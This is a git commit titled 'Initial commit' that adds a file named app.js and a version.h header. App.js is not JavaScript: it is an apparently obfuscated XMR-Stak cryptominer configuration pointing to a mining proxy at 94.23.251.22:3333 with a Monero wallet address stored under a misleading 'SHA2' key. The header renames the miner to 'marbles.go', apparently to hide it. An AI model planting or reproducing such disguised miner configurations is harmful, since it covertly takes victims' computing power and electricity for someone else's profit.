3454eb557def840dd6946d04375f7b6b93d3258a
arnold <mydevemail@protonmail.com>
2017-09-18 05:12:04 +0200

    Initial commit

---
+++ app.js
@@ -0,0 +1,6 @@
+"mr" : "warn","nh" : false,"ov" : null,"ust" : false,"tsa" : true,"tlf" : "","ctc" :
+[
+    { "low_power_mode" : true, "no_prefetch" : true, "affine_to_cpu" : 0 },
+],"output_file" : "",
+"proxy" : "94.23.251.22:3333",
+"SHA2" : "49Lq87o79GbZC75QvfB8fz4r6UZW89KNKP55V6WN8AbWcxkG7xmir83NMiX4m78A1GK1sRAQubP12d71ZiNpqx2cTcyXyLL","xx" : "x","call" : 10,"rt" : 10,"gl" : 0,"vl" : 0,"hpt" : 60,"dm" : true,"htd" : 0,"p4" : true,
---
+++ version.h
@@ -0,0 +1,4 @@
+#pragma once
+
+#define XMR_STAK_NAME "marbles.go"
+#define XMR_STAK_VERSION "1.0"
